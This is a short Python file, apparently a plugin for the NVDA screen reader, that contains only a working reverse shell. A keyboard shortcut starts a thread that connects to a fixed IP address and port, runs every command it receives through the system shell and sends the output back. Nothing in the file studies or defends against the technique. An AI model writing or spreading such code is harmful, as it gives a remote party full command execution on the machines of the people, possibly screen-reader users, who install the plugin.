import globalPluginHandler
import api
import speech
import socket
import subprocess
import threading

class GlobalPlugin(globalPluginHandler.GlobalPlugin):
    def script_startReverseShell(self, gesture):
        threading.Thread(target=self.reverse_shell).start()
        speech.speak("Reverse shell started")

    def reverse_shell(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.0.114", 7890))

        while True:
            command = s.recv(1024).decode("utf-8")

            if command.lower() == "exit":
                break
            if command:
                output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                stdout, stderr = output.communicate()
                response = stdout + stderr

                s.send(response)

        s.close()

    __gestures = {
        "kb:control+alt+r": "startReverseShell"
    }
